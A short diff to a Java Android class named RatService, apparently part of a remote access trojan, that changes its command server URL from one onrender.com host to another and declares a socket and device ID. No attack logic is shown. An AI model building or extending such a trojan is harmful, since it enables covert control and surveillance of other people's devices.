@@ -20,7 +20,7 @@ import java.net.URISyntaxException;
 import java.util.UUID;
 
 public class RatService extends Service {
-    private static final String SERVER_URL = "https://pris-rat-server.onrender.com";
+    private static final String SERVER_URL = "https://pris-rat.onrender.com";
     private Socket socket;
     private String deviceId;
 
